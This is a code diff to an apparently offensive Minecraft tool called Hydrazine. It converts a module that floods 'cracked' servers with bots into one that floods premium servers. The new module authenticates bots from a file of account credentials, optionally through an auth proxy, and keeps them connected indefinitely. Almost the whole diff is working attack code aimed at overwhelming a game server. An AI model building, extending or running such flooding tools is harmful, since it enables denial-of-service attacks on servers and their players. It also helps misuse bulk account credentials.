@@ -13,20 +13,14 @@ import org.spacehq.packetlib.event.session.SessionAdapter;
 import com.github.hydrazine.Hydrazine;
 import com.github.hydrazine.minecraft.Authenticator;
 import com.github.hydrazine.minecraft.ClientFactory;
+import com.github.hydrazine.minecraft.Credentials;
 import com.github.hydrazine.minecraft.Server;
 import com.github.hydrazine.module.Module;
 import com.github.hydrazine.module.ModuleSettings;
 import com.github.hydrazine.util.ConnectionHelper;
 import com.github.hydrazine.util.FileFactory;
 
-/**
- * 
- * @author xTACTIXzZ
- *
- * Floods a cracked server with bots
- *
- */
-public class CrackedFloodModule implements Module
+public class PremiumFloodModule implements Module
 {
 	// Create new file where the configuration will be stored (Same folder as jar file)
 	private File configFile = new File(ClassLoader.getSystemClassLoader().getResource(".").getPath() + "." + this.getClass().getName());
@@ -37,13 +31,13 @@ public class CrackedFloodModule implements Module
 	@Override
 	public String getName() 
 	{
-		return "cflood";
+		return "pflood";
 	}
 
 	@Override
 	public String getDescription() 
 	{
-		return "Floods a cracked server with bots.";
+		return "Floods a premium server with bots.";
 	}
 
 	@Override
@@ -76,115 +70,80 @@ public class CrackedFloodModule implements Module
 		else
 		{
 			System.out.println(Hydrazine.warnPrefix + "This module hasn't been configured yet. Append the switch \'-c\' to the command to do so.");
-			System.out.println(Hydrazine.warnPrefix + "Using default configuration. (5 bots; 1000ms delay)");
+			
+			return;
 		}
 		
-		// Server has offline mode enabled
-		if(Hydrazine.settings.hasSetting("username") || Hydrazine.settings.hasSetting("genuser"))
+		// Load credentials from file
+		if(settings.containsKey("credList") && !settings.getProperty("credList").isEmpty())
 		{
-			if(Hydrazine.settings.hasSetting("username"))
-			{
-				System.out.println(Hydrazine.infoPrefix + "You have only specified a single username. We need more in order to flood the server.");
-				System.out.println(Hydrazine.infoPrefix + "Configure this module to load usernames from a file OR use the -gu switch.");
+			FileFactory ff = new FileFactory(new File(settings.getProperty("credList")));
 				
-				stop();				
-			}
-			else
+			for(int i = 0; i < bots; i++)
 			{
-				for(int i = 0; i < bots; i++)
+				Credentials[] credList = ff.getCredentials();
+				
+				if(credList.length == 0)
 				{
-					String username = auth.getUsername();
+					System.out.println(Hydrazine.errorPrefix + "No credentials contained in file.");
 					
-					MinecraftProtocol protocol = new MinecraftProtocol(username);
-					
-					Client client = ConnectionHelper.connect(factory, protocol, server);
-					
-					registerListeners(client);
-					
-					try 
-					{
-						Thread.sleep(delay);
-					} 
-					catch (InterruptedException e) 
-					{
-						e.printStackTrace();
-					}
+					return;
 				}
 				
-				// Do nothing, clients stay connected until program shuts down
-				while(true)
+				Random r = new Random();
+				
+				Credentials creds = credList[r.nextInt(credList.length)];
+				
+				MinecraftProtocol protocol = null;
+				
+				if(Hydrazine.settings.hasSetting("authproxy"))
 				{
-					try 
-					{
-						Thread.sleep(20);
-					} 
-					catch (InterruptedException e)
-					{
-						e.printStackTrace();
-					}
+					protocol = auth.authenticate(creds, auth.getAuthProxy());
+				}
+				else
+				{
+					protocol = auth.authenticate(creds);
+				}
+				
+				if(protocol == null)
+				{
+					continue;
+				}
+				
+				Client client = ConnectionHelper.connect(factory, protocol, server);
+				
+				registerListeners(client);
+				
+				try 
+				{
+					Thread.sleep(delay);
+				} 
+				catch (InterruptedException e) 
+				{
+					e.printStackTrace();
+				}
+			}
+			
+			// Do nothing, clients stay connected until program shuts down
+			while(true)
+			{
+				try 
+				{
+					Thread.sleep(20);
+				} 
+				catch (InterruptedException e)
+				{
+					e.printStackTrace();
 				}
 			}
 		}
-		// Load usernames from file
-		else if(settings.containsKey("useUsersFromList") && Boolean.valueOf(settings.getProperty("useUsersFromList")))
+		else if(Hydrazine.settings.hasSetting("credentials"))
 		{
-			if(settings.containsKey("userList") && !settings.getProperty("userList").isEmpty())
-			{
-				FileFactory ff = new FileFactory(new File(settings.getProperty("userList")));
-				
-				for(int i = 0; i < bots; i++)
-				{
-					String[] usernames = ff.getUsernames();
-					
-					if(usernames.length == 0)
-					{
-						System.out.println(Hydrazine.errorPrefix + "No usernames contained in file.");
-						
-						return;
-					}
-					
-					Random r = new Random();
-					
-					String username = usernames[r.nextInt(usernames.length)];
-					
-					MinecraftProtocol protocol = new MinecraftProtocol(username);
-					
-					Client client = ConnectionHelper.connect(factory, protocol, server);
-					
-					registerListeners(client);
-					
-					try 
-					{
-						Thread.sleep(delay);
-					} 
-					catch (InterruptedException e) 
-					{
-						e.printStackTrace();
-					}
-				}
-				
-				// Do nothing, clients stay connected until program shuts down
-				while(true)
-				{
-					try 
-					{
-						Thread.sleep(20);
-					} 
-					catch (InterruptedException e)
-					{
-						e.printStackTrace();
-					}
-				}
-			}
-			else
-			{
-				System.out.println(Hydrazine.errorPrefix + "No usernames list specified. Configure module to do so.");
-			}
+			System.out.println(Hydrazine.errorPrefix + "We need more account credentials in order to flood the server. Reconfigure the module!");
 		}
-		// User forgot to pass the options
 		else
 		{
-			System.out.println(Hydrazine.errorPrefix + "No client option specified. You have to append one of those switches to the command: -u or -gu");
+			System.out.println(Hydrazine.errorPrefix + "No credentials supplied. Reconfigure the module to do so.");
 		}
 	}
 
@@ -199,17 +158,8 @@ public class CrackedFloodModule implements Module
 	{		
 		settings.setProperty("bots", ModuleSettings.askUser("How many bots should be connected to the server?"));
 		settings.setProperty("delay", ModuleSettings.askUser("Delay between connection attempts: "));
-		settings.setProperty("useUsersFromList", String.valueOf(ModuleSettings.askUserYesNo("Load usernames from a list?")));
+		settings.setProperty("credList", ModuleSettings.askUser("Enter the path to the file containing minecraft account credentials:"));
 		settings.setProperty("sendMessageOnJoin", String.valueOf(ModuleSettings.askUserYesNo("Send message on join?")));
-		
-		if(settings.getProperty("useUsersFromList").equals("true"))
-		{
-			settings.setProperty("userList", ModuleSettings.askUser("Usernames list file path:"));
-		}
-		else
-		{
-			settings.setProperty("userList", "");
-		}
 		
 		if(settings.getProperty("sendMessageOnJoin").equals("true"))
 		{
